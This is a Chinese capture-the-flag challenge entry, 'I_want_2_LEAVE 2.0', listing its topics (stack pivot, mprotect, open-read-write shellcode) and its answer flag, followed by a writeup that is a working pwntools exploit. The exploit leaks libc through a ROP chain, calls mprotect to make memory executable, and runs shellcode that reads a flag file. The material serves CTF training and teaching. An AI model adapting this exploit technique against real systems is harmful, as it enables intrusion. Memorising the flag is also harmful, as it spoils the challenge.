- **题目名称：** I_want_2_LEAVE 2.0
- **题目类型：** PWN  
- **题目难度：**简单
- **出题人：** i-Corner
- **考点：**

1. 栈迁移
1. mprotect
1. orw

- **描述：** PWN真是太逊啦，又双叒叕想跑路了
- **flag：** XSCTF{7bd8caa6-8b04-e7ae-19f8-885567def3b5}
- **Writeup：**

```python
#测试请在Ubuntu18环境下

from pwn import *
context(log_level='DEBUG',arch='amd64')
p = process("./shell")
#p = remote("0.0.0.0",10001)
e = ELF("./shell")
libc = ELF("./libc-2.27.so")
p.timeout = 0.5
ret = 0x400536
rdi = 0x400863
rsi = 0x23a6a
rdx = 0x1b96
bss= 0x601010 + 0x300
leave_ret = 0x4007FB
main_addr = 0x40075d
p.recvuntil(b"soft! try me :)\n")
pl1 = b'a'*(0x20) + p64(0) + p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(main_addr)
p.send(pl1)
base = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00')) - libc.sym['puts']
success("base:" +hex(base))
p.recvuntil(b"soft! try me :)\n")
pl2 = b'a'*(0x20) + p64(0) + p64(rdi) + p64(0x600000)+ p64(base+rsi)+ p64(0x2000)+ p64(base+rdx) + p64(7) + p64(base+libc.sym['mprotect']) + p64(main_addr)

p.send(pl2)
pl3 = b'a'*(0x28)+ p64(rdi) + p64(0) + p64(base+rsi) + p64(0x600000+0x500) + p64(base+rdx) + p64(0x100) + p64(e.plt['read']) + p64(0x600000+0x500)
p.recvuntil(b"soft! try me :)\n")
mmap=0x600000
orw_payload=shellcraft.open('./flag')           
orw_payload+=shellcraft.read(3,mmap,0x50)       
orw_payload+=shellcraft.write(1,mmap,0x50)      


p.send(pl3)
sleep(0.2)

p.send(asm(orw_payload))

p.interactive()

```
